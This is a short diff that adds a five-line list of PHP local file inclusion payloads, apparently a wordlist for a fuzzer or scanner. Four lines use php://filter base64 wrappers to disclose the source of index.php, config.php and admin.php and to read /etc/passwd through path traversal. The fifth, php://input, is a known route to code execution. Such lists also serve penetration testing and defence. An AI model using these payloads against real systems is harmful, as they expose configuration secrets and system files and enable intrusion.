@@ -1,0 +1,5 @@
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=admin.php
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+php://input
